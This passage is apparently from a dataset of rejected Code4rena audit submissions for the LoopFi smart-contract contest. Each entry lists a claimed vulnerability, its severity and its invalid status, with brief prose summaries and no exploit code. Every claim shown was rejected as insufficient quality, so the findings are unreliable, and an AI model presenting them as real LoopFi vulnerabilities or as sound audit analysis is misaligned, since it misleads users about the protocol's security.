The function 'maxMint' and 'maxDeposit' do not follow EIP-4626's specification. 'function maxMint MUST return the maximum amount of shares mint would allow to be deposited to receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.'

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Unlimited Token Generation Exploit in PoolV3.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-759
- **Submitter:** JC
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/759
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-759.md

## Brief Summary

In PoolV3.sol, just before the end, there is a function called `mintProfit`. This function is allowing the minting of unlimited tokens by the caller if the caller is marked as a credit manager. This can pose a massive security issue as it can potentially be exploited by an attacker to mint unlimited tokens, leading to high inflation and decreasing the value of existing tokens substantially.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# Hardcoded Timestamp Values can introduce rounding errors

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-764
- **Submitter:** JC
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/764
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-764.md

## Brief Summary

Hardcoding timestamp values and using the difference between timestamps to compute interest could potentially introduce rounding errors. Such financial computations should rely on timestamp differences as little as possible. In PoolV3.sol, the `lastBaseInterestUpdate` and `lastQuotaRevenueUpdate` are hard-coded timestamp values. These are used to compute the base interest rate and the quota revenue accrued since the last update, respectively (functions `_calcBaseInterestAccrued` and `_calcQuotaRevenueAccrued`).

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Unrestricted Withdraw Function in Silo.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-771
- **Submitter:** JC
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/771
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-771.md

## Brief Summary

The function "withdraw" is used to move funds from the contract to a specified address. It is only supposed to be accessed by the STAKING_VAULT, as per the "onlyStakingVault" modifier. However, there is no check incorporated to ensure that the "to" address is not a malicious one or an attacker's address. This could allow an attacker to drain funds from the contract.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary, :robot:_83_group

# No Access Control on Contract Initialization in Silo.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-774
- **Submitter:** JC
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/774
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-774.md

## Brief Summary

The contract Silo.sol has one common vulnerability related to initializations. The constructor of the contract takes two parameters, `_stakingVault` and `_lpEth`, which are then set as immutable state variables, `STAKING_VAULT` and `lpETH` respectively. The issue here is that there is no access control to prevent an unauthorized entity from deploying the contract and being able to initialize it with any arbitrary address. This could be a potential security risk as it could lead to unauthorized functionality in the contract.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Inefficient Removal of Vaults in VaultRegistry.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-778
- **Submitter:** JC
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/778
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-778.md

## Brief Summary

`_removeVaultFromList` function has an inefficient way of removing vaults from the 'vaultList' array. The function iterates over the 'vaultList' array until it finds a match, then it moves the last element to the position of the loop iterator and pops the last element from the array. This could lead to high gas usage when removing vaults, particularly when the 'vaultList' array grows large. Furthermore, the operation is not entirely safe as it can potentially reorder the vaults in the 'vaultList' array, which could lead to unexpected behavior. This function violates the "Principle of Least Astonishment," which states users should not be surprised by the behavior of a system.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_139_group

# Potential Configuration Parameter Truncation Risk

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-645
- **Submitter:** Jerry0x
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/645
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-645.md

## Brief Summary

In the `setParameter` function, converting the `uint256` type `data` to `uint128` or `uint64` type may result in truncation. This means that if the value of `data` exceeds the maximum value of the target type, the higher bits will be discarded, which may lead to data loss or unexpected behavior. Such truncation can cause the contract configuration parameters to be set incorrectly, thereby affecting the normal operation and security of the contract.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary, :robot:_05_group

# Precision loss in debt Calc for CDPVault Repayments

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-304
- **Submitter:** K42
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/304
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-304.md

## Brief Summary

I found precision loss in the debt calculation of [CDPVault](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L652): - Impact is incorrect debt tracking, causing users to repay more or less debt than they actually owe. I wrote a

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Approval Race Conditions

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-235
- **Submitter:** Kavin
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/235
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-235.md

## Brief Summary

Detailed description of the impact of this finding. Approval race conditions can lead to unexpected behaviors where an attacker can front-run the transaction. This could result in unauthorized spending of tokens, potentially leading to a loss of funds for the users of the contract. This issue poses a medium risk to the integrity and security of the token transfer operations within the contract.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# contracts are vulnerable to feeontransfer accounting related issue

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-20
- **Submitter:** MFaizal14
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/20
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-20.md

## Brief Summary

Contracts that do not account for fee-on-transfer tokens may incorrectly calculate balances, leading to discrepancies between expected and actual token amounts.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_76_group

# recoverERC20() can be used as a backdoor by the owner to retrieve rewardsToken

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-371
- **Submitter:** MSaptarshi
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/371
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-371.md

## Brief Summary

Admin might recover the staked token, instead of the rewards token

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_97_group

# Griefing attack possible by continuous deposit and withdrawal

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-404
- **Submitter:** MSaptarshi
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/404
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-404.md

## Brief Summary

A malicious user can flood the deposit() by making thousands of deposits for only dust amount. For a very small amount he can flood with thousands of requests without any impact for him, He can withdraw it similarly without any problem for him

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Lenders are unable to stake lpETH.

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-393
- **Submitter:** Modey
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/393
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-393.md

## Brief Summary

Lenders are unable to receive rewards from staking lpETH, because there is no functionality for this in `StakingLPEth.sol`

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary, :robot:_95_group

# Lack of Access Control in `deposit`, `withdraw`, and `modifyCollateralAndDebt` Functions

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-150
- **Submitter:** Mrxstrange
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/150
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-150.md

## Brief Summary

* The `CDPVault.sol` contract is vulnerable due to the lack of access control in the `modifyCollateralAndDebt` function, which is called by both `deposit` and `withdraw` functions. Implementing strict access controls is essential to secure these functions and prevent potential attacks on user balances and the contract state. Affected Code: **`deposit` Function: CDPVault.sol#L223** **`withdraw` Function: CDPVault.sol#L239** **`modifyCollateralAndDebt` Function:CDPVault.sol#L373** Impact: - **Unauthorized State Modification**: Any external contract or address can invoke `modifyCollateralAndDebt` directly, bypassing intended controls and potentially manipulating user collateral and debt balanc...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_15_group

# Lack of Fee Calculation in `_amountWithFee` Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-495
- **Submitter:** Mrxstrange
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/495
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-495.md

## Brief Summary

This issue can lead to incorrect asset calculations during minting, potentially resulting in users not being charged the intended fees, which could affect the protocol’s economics and lead to financial loss. **Description**: The `_amountWithFee` function in this contract `PoolV3.sol` the provided code is designed to apply a fee to the calculated assets. However, the current implementation of the function simply returns the input amount without any modification, effectively bypassing the fee calculation. This results in users receiving assets without any fee deduction, which might not align with the intended logic of the contract.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_22_group

# Redundant Function Logic in `_convertToAssets`

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-496
- **Submitter:** Mrxstrange
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/496
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-496.md

## Brief Summary

The issue can lead to an inaccurate conversion of shares to assets, particularly in cases where the vault has a non-zero total supply and total assets. This can result in incorrect asset distribution to users, potentially causing financial discrepancies. **Description**: The `_convertToAssets` function is intended to convert a given number of shares into the corresponding amount of assets. However, the current implementation merely returns the number of shares without performing any meaningful conversion. The commented-out code within the function suggests that there is a more complex logic intended to handle cases where the total supply and total assets are non-zero, but this logic is curr...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Inadequate Error Handling in ChainlinkOracle's getStatus Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-728
- **Submitter:** NexusAudits
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/728
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-728.md

## Brief Summary

The ChainlinkOracle contract provides a `getStatus` function to check the validity of price data for a given token. The `getStatus` function fails to properly communicate errors that occur during the price fetching process. It only returns a boolean status, which doesn't provide enough information about potential failures. The current implementation of `getStatus` is as follows: This implementation has two main problems: 1. It silently catches any exceptions that might occur in `_fetchAndValidate`. 2. It doesn't distinguish between different types of failures (e.g., stale data, zero price, or external call failure).

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Race Condition in Price Validation can Lead to False Positives

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-729
- **Submitter:** NexusAudits
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/729
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-729.md

## Brief Summary

The `BalancerOracle` contract is designed to provide price information for tokens in a Balancer pool. The `_getStatus` function is crucial for determining whether the current price data is valid and up-to-date. The `_getStatus` function has a race condition that can lead to returning a false positive status immediately after an update, even if the new price hasn't been properly set.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Non compliance with ERC-4626 Standard for totalAssets

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-731
- **Submitter:** NexusAudits
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/731
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-731.md

## Brief Summary

According to ERC-4626, `totalAssets()` should return the total amount of underlying assets managed by the vault. This typically includes the actual balance of underlying tokens held by the vault plus any assets deployed elsewhere (e.g., lent out). The current implementation returns `expectedLiquidity()`, which, based on its definition elsewhere in the contract, includes not only the actual assets but also accrued interest and quota revenue that hasn't been realized yet. ERC-4626 expects `totalAssets()` to reflect the current, real value of assets, not projected or expected future values.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Preview Functions Don't Revert Appropriately According to ERC4626 standards

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-761
- **Submitter:** NexusAudits
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/761
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-761.md

## Brief Summary

The preview functions (e.g., `previewDeposit`, `previewWithdraw`, `previewRedeem`) do not revert when the function they are previewing would revert, which is against ERC4626 standards. Impact - This can lead to unexpected behavior, as users may rely on these functions to assess the viability of their transactions without proper feedback on potential reverts. Details 1. **Deposit Function** - The `deposit` function will revert if the pool is paused, if the receiver address is zero, or if the assets sent are less than the required minimum due to fees. - The `previewDeposit` function does not revert even if the underlying conditions (like pool status) would cause the actual deposit to fail. Co...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary

# CDPVault::withdraw() should transfer funds to the "To" address passed as parameter, not the msg.sender

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-245
- **Submitter:** TECHFUND-inc
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/245
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-245.md

## Brief Summary

When the collateral is withdrawn, the `CDPVault::withdraw()` function accepts `to` address as the target recipient of the tokens. But, the token are instead being transferred to the `msg.sender`, the caller of the function.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary, :robot:_96_group

# "_penaltyInfo" can revert due to no check on "vestDuration"

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-582
- **Submitter:** bareli
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/582
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-582.md

## Brief Summary

Detailed description of the impact of this finding. In _penaltyInfo there is no check on vestDuration which can cause the penaltyAmount greater than earning.amount which can cause _ieeWithdrawableBalance,withdraw to revert.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# _previewReward can revert.

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-637
- **Submitter:** bareli
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/637
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-637.md

## Brief Summary

Detailed description of the impact of this finding. IOracle(feed).spot(asset() can be 0 and _previewReward can revert.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# No array length check in multisend

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-738
- **Submitter:** bareli
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/738
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-738.md

## Brief Summary

Detailed description of the impact of this finding. Here there is no array length check in multisend. There is no array length check whether targets ,data and delegateCall are all same length.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Lack of Validation in setParameter Allows Unsafe Configurations Leading to Potential Under-Collateralization

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-504
- **Submitter:** bhatmuneeb
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/504
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-504.md

## Brief Summary

The `setParameter` function in the `CDPVault.sol` contract is designed to allow privileged users (those with the `VAULT_CONFIG_ROLE`) to modify several critical configuration parameters. These parameters, including `debtFloor`, `liquidationRatio`, `liquidationPenalty`, and `liquidationDiscount`, are vital to the proper functioning and stability of the vault. However, the current implementation does not include validation checks for the values being set. This oversight creates a vulnerability where these parameters can be configured with unsafe values, potentially leading to under-collateralization of user positions. Such misconfigurations could destabilize the vault, leading to significant...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# Unchecked Arithmetic in calcDecrease Function Can Lead to Integer Overflow/Underflow

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-522
- **Submitter:** bhatmuneeb
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/522
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-522.md

## Brief Summary

The `calcDecrease` function in `CDPVault.sol` performs several arithmetic operations to compute the new debt and interest values after a debt repayment. Although Solidity 0.8.x includes built-in checks for overflow and underflow, it is still important to be cautious with arithmetic operations, especially when large values are involved. The function does not use safe math libraries, which could result in incorrect calculations under specific edge cases where large or unexpected values are processed. If such values lead to overflow or underflow, the function may calculate incorrect debt values, leading to financial discrepancies and potential losses for the protocol. The c`alcDecrease` functi...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_233_group

# Lack of Zero-Address Check in mintProfit Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-725
- **Submitter:** bhatmuneeb
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/725
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-725.md

## Brief Summary

The mintProfit function, which mints new tokens to the treasury based on a specified amount, does not include a check to ensure that the treasury address is not the zero address. If the treasury address is ever mistakenly set to the zero address, calling mintProfit could result in the accidental minting of tokens to the zero address, effectively burning them permanently. Zero-Address Risk: There is no validation to ensure that the treasury address is not set to the zero address. If this occurs, tokens intended for the treasury could be irretrievably lost. Unrecoverable Loss: If tokens are minted to the zero address, they are effectively burned and cannot be recovered, leading to a direct fi...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Inadequate Access Control in `setAllowed` Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-733
- **Submitter:** bhatmuneeb
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/733
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-733.md

## Brief Summary

The setAllowed function allows a controller to grant or revoke withdrawal and redemption permissions for specific accounts even when the pool is locked. However, there is no limitation or logging mechanism on who can be added or removed, which could be exploited by a malicious or compromised controller to allow unauthorized accounts to access pool funds during a lock period. Lack of Granular Control: The function allows any controller to add or remove accounts from the _allowed mapping, granting them privileges to withdraw or redeem from the pool even when it is locked. There is no mechanism to limit or monitor these changes, which could be abused. Potential for Exploitation: A malicious co...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# PositionActions.sol : CreditFlashloan function should be checked as well for fix

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-276
- **Submitter:** boraichodrunkenmaster
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/276
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-276.md

## Brief Summary

Can lead to loss of funds for user etc...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Unauthorised call of the flashLoan function in the Flashlender contract

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-101
- **Submitter:** debo
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/101
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-101.md

## Brief Summary

Detailed description of the impact of this finding. The vulnerability allows any external user to execute the flashLoan function without proper authorisation checks, potentially leading to unauthorised and exploitative flash loans. This can result in financial losses for the protocol if malicious users manipulate loan conditions for personal gain. The flashLoan function in the Flashlender contract does not implement sufficient authorisation checks to ensure that only authorised entities can call the function. The lack of access control allows any external actor to invoke the flash loan functionality, leading to potential misuse of protocol resources. The absence of authorisation checks on t...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary, :robot:_116_group

# Division by Zero in deposit Function within the CDPVault contract

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-142
- **Submitter:** debo
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/142
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-142.md

## Brief Summary

Detailed description of the impact of this finding. This report highlights a critical division by zero vulnerability in the deposit function of the CDPVault contract. If amount or tokenScale are zero, a division by zero will cause the transaction to revert or not, either way consuming unnecessary gas associated with the transaction with or without making any state changes. This leads to waste of a transaction or a failed transactions and a poor user experience. The contract could become unreliable and frustrating for users if division by zero errors occur frequently. This impacts the overall trust in the contract’s functionality.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Lack of Input Validation in setCreditManager Function within PoolQuotaKeeperV3 contract

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-341
- **Submitter:** debo
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/341
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-341.md

## Brief Summary

Detailed description of the impact of this finding. The setCreditManager function does not validate the token and vault parameters, which could lead to erroneous or malicious configurations if zero addresses are inadvertently set. This can cause downstream errors in other parts of the contract that rely on creditManagers mapping to be correctly initialised.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Lack of Parameter Validation for ERC20 Token Recovery in the RecoverERC20 contract

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-350
- **Submitter:** debo
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/350
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-350.md

## Brief Summary

Detailed description of the impact of this finding. The lack of a balance check before transferring ERC20 tokens can result in failed transactions when the requested tokenAmount exceeds the contract’s balance. This not only leads to wasted gas fees for users but also results in a poor user experience due to unexpected transaction failures. The absence of this check can cause operational inefficiencies and confusion among users interacting with the contract. ***Use Case*** A similar issue was encountered in the DeFi protocol Compound. Users experienced transaction failures when attempting to withdraw more funds than were available in a particular market. This led to wasted gas fees and user...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Unauthorized Access to setRelock Function in the MultiFeeDistribution contract

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-87
- **Submitter:** debo
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/87
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-87.md

## Brief Summary

Detailed description of the impact of this finding. The setRelock function in the MultiFeeDistribution contract can be called by any address without any access control. This function allows users to enable or disable the auto-relock feature. Without proper access restrictions, unauthorised users can alter the auto-relock status. Location: MultiFeeDistribution.sol *

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_123_group

# Unsafe Position Allowed in modifyCollateralAndDebt Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-158
- **Submitter:** emerald7017
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/158
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-158.md

## Brief Summary

When `deltaDebt` is zero and `deltaCollateral` is negative, the function incorrectly determines that the position is safe, even if the collateral value is insufficient to cover the debt. The root cause is in the following code block in the `modifyCollateralAndDebt` function: [CDPVault.sol#L451-L454](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L451-L454) The condition `(deltaDebt > 0 || deltaCollateral < 0)` checks if the debt is increasing or the collateral is decreasing, which would make the position riskier. However, the subsequent check using the `_isCollateralized` function fails to handle the case when `deltaDebt` is zero...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_236_group

# Overflow in liquidatePositionBadDebt() Leading to System Insolvency

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-175
- **Submitter:** emerald7017
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/175
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-175.md

## Brief Summary

`liquidatePositionBadDebt()` responsible for liquidating positions that have fallen below the required collateralization ratio and have accumulated bad debt there is a vulnerability in the calculation of the loss variable within `liquidatePositionBadDebt()` that can lead to an overflow, can cause the system to become insolvent, as the new total debt may exceed the value of the collateral multiplied by the spot price. [CDPVault.sol#L600-L607](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L600-L607) Impact If the `calcTotalDebt(debtData)` is significantly larger than `repayAmount`, the subtraction operation `calcTotalDebt(debtData)...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_47_group

# Incorrect Minting of Shares in _deposit() Function Violates Expected Behavior

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-234
- **Submitter:** emerald7017
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/234
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-234.md

## Brief Summary

